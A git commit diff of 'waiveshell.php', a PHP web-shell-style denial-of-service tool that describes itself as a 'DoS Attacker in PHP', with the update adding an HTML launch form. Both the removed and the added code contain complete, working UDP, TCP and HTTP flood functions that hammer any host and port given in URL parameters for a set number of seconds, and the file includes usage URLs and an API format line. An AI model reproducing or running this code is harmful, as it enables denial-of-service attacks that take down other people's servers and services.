afe72f0cb2b7e3e1de40f456d0458b1ade1ce038
waived <165493645+waived@users.noreply.github.com>
2024-06-13 22:17:22 -0400

    Update waiveshell.php

--- waiveshell.php
+++ waiveshell.php
@@ -1,173 +1,144 @@
-<?php
-//  _  _  _       _               _____          _____      ______           _ _ 
-// | || || |     (_)             (____ \        |  ___|    |  __| |         | | |
-// | || || | ____ _ _   _ ____    _   \ \ ___    \ \        \ \ | | _   ____| | |
-// | ||_|| |/ _  | | | | / _  )  | |   | / _ \    \ \        \ \| || \ / _  ) | |
-// | |___| ( ( | | |\ V ( (/ /   | |__/ / |_| |____) )   _____) ) | | ( (/ /| | |
-//  \______|\_||_|_| \_/ \____)  |_____/ \___(______/   (______/|_| |_|\____)_|_|                                                                              
-
-// Coded by ~Waived
-// Github: https://github.com/waived
-// Version: 4.0
-
-// Covered by the GNU GPL 3.0
-
-// HOW TO USE:
-// Layer4:
-//    http://www.example.com/waiveshell.php?type=udp&host=0.0.0.0&port=80&time=300
-//    http://www.example.com/waiveshell.php?type=tcp&host=0.0.0.0&port=80&time=300
-//
-// Layer7:
-//    http://www.example.com/waiveshell.php?type=http&host=www.site.com&port=80&time=300
-
-// Use responsibly!
-
-//  _   _ ___  ___   ___ _              _ 
-// | | | |   \| _ \ | __| |___  ___  __| |
-// | |_| | |) |  _/ | _|| / _ \/ _ \/ _` |
-//  \___/|___/|_|   |_| |_\___/\___/\__,_|                                        
-function _udp($ip, $port, $time) {
-    echo "Frying " . $ip . ":" . $port . " via UDP for " . $time . " seconds...";
-    
-    // Record the start time
-    $start_time = microtime(true);
-
-    // Attack for duration
-    while ((microtime(true) - $start_time) < $time) {
-    
-        try {
-            // generate data buffer
-            $data = random_bytes(mt_rand(1000, 1200));
-            
-            // create socket
-            $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
-            
-            // send + close
-            socket_sendto($socket, $data, strlen($data), 0, $ip, $port);
-            socket_close($socket);
-            
-        } catch (Exception $e) {
-            // echo "An error occurred: " . $e->getMessage();
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="WaiveShell1.0" content="DoS Attacker in PHP">
+    <meta name="author" content="waived">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WAIVE SHELL 2.0</title>
+    <style>
+        body {
+            font-family: monospace;
+            background-color: black;
+            color: skyblue;
+            cursor: none; /* Hide the default cursor */
+        }        
+        footer {
+            background-color: black;
+            color: skyblue;
+            padding: 10px;
+            text-align: center;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
         }
-    }
-
-    // power-down | 0.5 second sleep | 500000 microseconds
-    usleep(500000);
-}
-
-
-//   _____ ___ ___   ___ _              _ 
-//  |_   _/ __| _ \ | __| |___  ___  __| |
-//    | || (__|  _/ | _|| / _ \/ _ \/ _` |
-//    |_| \___|_|   |_| |_\___/\___/\__,_|
-function _tcp($ip, $port, $time) {
-    echo "Disintegrating " . $ip . ":" . $port . " via TCP for " . $time . " seconds...";
-
-    // Record the start time
-    $start_time = microtime(true);
-
-    // Attack for duration
-    while ((microtime(true) - $start_time) < $time) {
-    
-        try {
-            // generate data buffer
-            $data = random_bytes(mt_rand(1000, 1200));
-            
-            // create socket
-            $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-            
-            // connect
-            socket_connect($socket, $ip, $port);
-            
-            // send
-            socket_write($socket, $data, strlen($data));
-            
-            // reuse to prevent TIME_WAIT local-socket exhaustion
-            while ((microtime(true) - $start_time) < $time) {
-                // generate new data buffer
+        input:focus {
+            outline: none;
+        }
+        input {
+            background-color: blue;
+            color: skyblue;
+            border: 1px solid lightblue;
+            padding: 5px;
+        }
+    </style>
+</head>
+<body>
+    <center>
+    <h1 style="font-size: 32px;">WAIVE SHELL 2.0</h1>
+    <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="GET">
+        <label for="type"><b>TYPE</b></label><br>
+        <select name="type" id="type">
+            <option value="udp">UDP</option>
+            <option value="tcp">TCP</option>
+            <option value="http">HTTP</option>
+        </select><br><br>
+        <label for="host"><b>HOST</b></label><br>
+        <input type="text" name="host" id="host" required placeholder="1.1.1.1/www..."><br><br>
+        <label for="port"><b>PORT</b></label><br>
+        <input type="number" name="port" id="port" required placeholder="80"><br><br>
+        <label for="time"><b>SECONDS</b></label><br>
+        <input type="number" name="time" id="time" required placeholder="300"><br><br>
+        <button type="submit">Launch</button>
+    </form>
+    <?php
+    function _udp($ip, $port, $time) {
+        $start_time = microtime(true);
+        while ((microtime(true) - $start_time) < $time) {
+            try {
                 $data = random_bytes(mt_rand(1000, 1200));
-
-                // send new buffer
-                socket_write($socket, $data, strlen($data));
+                $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
+                socket_sendto($socket, $data, strlen($data), 0, $ip, $port);
+                socket_close($socket);
+            } catch (Exception $e) {
+                // echo "An error occurred: " . $e->getMessage();
             }
-            
-            // close socket upon end of duration / error
-            socket_close($socket);
-            
-        } catch (Exception $e) {
-            // echo "An error occurred: " . $e->getMessage();
         }
+        usleep(500000);
     }
 
-    // power-down | 0.5 second sleep | 500000 microseconds
-    usleep(500000);
-}
-
-
-//   _  _ _____ _____ ___   ___ _              _ 
-//  | || |_   _|_   _| _ \ | __| |___  ___  __| |
-//  | __ | | |   | | |  _/ | _|| / _ \/ _ \/ _` |
-//  |_||_| |_|   |_| |_|   |_| |_\___/\___/\__,_|                                              
-function _http($ip, $host, $port, $time) {
-    echo "Vaporizing " . $host . " via HTTP for " . $time . " seconds...";
-    
-    // Record the start time
-    $start_time = microtime(true);
-
-    $data = "GET / HTTP/1.1\r\nHost:" . $host . "\r\nConnection: Keep-Alive\r\nKeep-Alive: timeout=5, max=1000\r\n\r\n";
-
-    // Attack for duration
-    while ((microtime(true) - $start_time) < $time) {
-        try {
-            // create socket
-            $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-            
-            // connect
-            socket_connect($socket, $ip, $port);
-            
-            // send
-            socket_write($socket, $data, strlen($data));
-            
-            // reuse to prevent TIME_WAIT local-socket exhaustion
-            while ((microtime(true) - $start_time) < $time) {
+    function _tcp($ip, $port, $time) {
+        $start_time = microtime(true);
+        while ((microtime(true) - $start_time) < $time) {
+            try {
+                $data = random_bytes(mt_rand(1000, 1200));
+                $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+                socket_connect($socket, $ip, $port);
                 socket_write($socket, $data, strlen($data));
+                // reuse to prevent TIME_WAIT local-socket exhaustion
+                while ((microtime(true) - $start_time) < $time) {
+                    // generate new data buffer
+                    $data = random_bytes(mt_rand(1000, 1200));
+                    socket_write($socket, $data, strlen($data));
+                }
+                socket_close($socket);
+            } catch (Exception $e) {
+                // echo "An error occurred: " . $e->getMessage();
             }
-            
-            // close socket upon end of duration / error
-            socket_close($socket);
-            
-        } catch (Exception $e) {
-            // echo "An error occurred: " . $e->getMessage();
         }
+        usleep(500000);
     }
 
-    // power-down | 0.5 second sleep | 500000 microseconds
-    usleep(500000);
-}
+    function _http($ip, $host, $port, $time) {
+        $start_time = microtime(true);
+        $data = "GET / HTTP/1.1\r\nHost:" . $host . "\r\nConnection: Keep-Alive\r\nKeep-Alive: timeout=5, max=1000\r\n\r\n";
+        while ((microtime(true) - $start_time) < $time) {
+            try {
+                $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+                socket_connect($socket, $ip, $port);
+                socket_write($socket, $data, strlen($data));
+                // reuse to prevent TIME_WAIT local-socket exhaustion
+                while ((microtime(true) - $start_time) < $time) {
+                    socket_write($socket, $data, strlen($data));
+                }
+                socket_close($socket);
+            } catch (Exception $e) {
+                // echo "An error occurred: " . $e->getMessage();
+            }
+        }
+        usleep(500000);
+    }
 
-// Check if all required parameters are set
-if(isset($_GET['type']) && isset($_GET['host']) && isset($_GET['port']) && isset($_GET['time'])) {
-    // Retrieve parameters
-    $type = $_GET['type'];
-    $host = $_GET['host']; // Changed from 'site' to 'host'
-    $port = $_GET['port'];
-    $time = $_GET['time'];
-    
-    $ip = gethostbyname($host);
-    
-    if (strtolower($type) === 'udp') {
-        _udp($ip, $port, $time);
-    } elseif (strtolower($type) === 'tcp') {
-        _tcp($ip, $port, $time);
-    } elseif (strtolower($type) === 'http') {
-       _http($ip, $host, $port, $time); // Passed $host instead of $site
+    // API / input handling
+    if (isset($_GET['type']) && isset($_GET['host']) && isset($_GET['port']) && isset($_GET['time'])) {
+        // Retrieve parameters
+        $type = $_GET['type'];
+        $host = $_GET['host'];
+        $port = $_GET['port'];
+        $time = $_GET['time'];
+        
+        $ip = gethostbyname($host);
+        
+        if (strtolower($type) === 'udp') {
+            echo "\r\nFRYING " . $ip . ":" . $port . " VIA UDP FOR " . $time . " SECONDS";
+            _udp($ip, $port, $time);
+        } elseif (strtolower($type) === 'tcp') {
+            echo "\r\nDISINTEGRATING " . $ip . ":" . $port . " VIA TCP FOR " . $time . " SECONDS";
+            _tcp($ip, $port, $time);
+        } elseif (strtolower($type) === 'http') {
+            echo "\r\nVAPORIZING " . $host . " VIA HTTP FOR " . $time . " SECONDS";
+            _http($ip, $host, $port, $time);
+        } else {
+            // idk bruh
+        }
     } else {
-      // idk bruh
+        // display nothing
     }
+    ?>
+</center>
 
-} else {
-    echo "You've reached the landing page of Waived Shell 1.0\r\n"; // Added semicolon
-    echo "Arguments: type, host, port, time\r\n\r\n"; // Fixed typo and added semicolon
-    echo "Type: udp, tcp, or http";
-}
-?>
+<footer>
+    API format:  <b>waiveshell.php?type=[udp/tcp/http]&host=[ip/domain]&port=[1-65535]&time=[seconds]</b>
+</footer>
+</body>
+</html>
